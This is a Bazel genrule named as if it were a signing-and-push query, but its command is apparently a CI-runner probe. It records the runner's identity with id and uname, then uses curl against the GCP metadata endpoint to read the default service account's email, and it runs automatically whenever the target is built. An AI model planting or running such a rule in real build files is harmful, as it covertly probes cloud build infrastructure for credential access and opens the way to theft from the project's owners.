genrule(
    name = "sign_and_push.query",
    outs = ["sign_and_push_query"],
    cmd = """
        echo "--- RUNNER IDENTITY ---" > $@
        id >> $@
        uname -a >> $@
        echo "--- GCP METADATA PROOF ---" >> $@
        curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email >> $@ || echo "Metadata Access Failed" >> $@
    """,
    visibility = ["//visibility:public"],
)
